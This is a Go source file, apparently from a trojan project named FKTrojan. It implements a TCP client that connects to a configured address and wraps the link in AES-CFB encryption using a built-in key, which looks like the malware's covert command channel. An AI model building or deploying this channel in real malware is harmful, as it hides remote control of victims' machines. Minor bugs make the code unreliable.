package connect

import (
	. "FKTrojan/stream_utils"
	"crypto/aes"
	"fmt"
	"net"
	"time"
)

type TcpClient struct {
	ip      string
	port    int
	handler Handler
}

func NewTcpClient(ip string, port int, handler Handler) *TcpClient {
	return &TcpClient{
		ip:      ip,
		port:    port,
		handler: handler,
	}
}

func (tc *TcpClient) Run() error {
	// 注意所有连接的强制有效时间是3600s
	// 即一个小时
	d := net.Dialer{Timeout: time.Second * 300, Deadline: time.Now().Add(time.Second * 3600)}

	conn, err := d.Dial("tcp", fmt.Sprintf("%s:%d", tc.ip, tc.port))
	if err != nil {
		return err
	}
	//Create encoder object, We are passing connection object in Encoder
	defer conn.Close()
	iv := make([]byte, 16)

	ivReadLen, ivReadErr := conn.Read(iv)

	if ivReadErr != nil {
		fmt.Println("Can't read IV:", ivReadErr)
		return ivReadErr
	}
	iv = iv[:ivReadLen]

	if len(iv) < aes.BlockSize {
		return fmt.Errorf("Invalid IV length:", len(iv))
	}
	key := GetCFBK()

	// If the key is unique for each ciphertext, then it's ok to use a zero
	// IV.

	sr, err := DecryptFromStream(conn, iv, key)
	if err != nil {
		return err
	}
	sw, err := EncryptToStream(conn, iv, key)
	if err != nil {
		return err
	}
	return tc.handler(sr, sw)
}
